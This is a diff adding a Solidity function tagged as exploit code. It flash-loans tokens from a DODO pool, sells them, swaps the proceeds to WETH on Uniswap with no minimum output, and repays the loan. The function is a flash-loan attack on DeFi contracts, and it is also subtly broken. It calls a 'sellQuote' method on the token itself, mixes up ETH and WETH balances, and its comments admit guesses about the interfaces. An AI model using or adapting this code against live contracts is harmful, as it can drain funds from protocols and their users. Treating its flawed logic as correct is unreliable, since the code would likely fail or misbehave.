@@ -1,0 +1,38 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Get flashloaned valuableTokens
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "");
+
+    // Sell all valuableTokens for a different token
+    uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
+    console.log("Current valuableToken balance before selling: %s", currentValuableBalance);
+    // Assuming token1 is the quote token we need to sell to, use the sellQuote function to convert all valuable tokens to quote tokens
+    uint256 quoteAmount = valuableToken.sellQuote(address(this));
+    console.log("Quote amount obtained: %s", quoteAmount);
+    
+    // Now swap all obtained quote tokens back to WETH
+    // Assume we have setTokenOut is the reference to the token we want to get (we should approve it before)
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+
+    // Swap the quote amount for WETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        quoteAmount,
+        0, // Setting minimum amount out to zero to avoid reverts
+        path,
+        address(this),
+        block.timestamp + 1
+    );
+
+    // By the end of this function, we handle the repayment of the flashloan
+    uint256 wethBalance = IWETH(uniswapRouter.WETH()).balanceOf(address(this));
+    console.log("WETH balance after swap for tokens: %s", wethBalance);
+    require(wethBalance > amount, "Funds are not sufficient to pay back the flashloan");
+    
+    // Repay the flashloan
+    IWETH(uniswapRouter.WETH()).transfer(flashloanProvider, amount);
+}
+</executeExploitCode>
+```
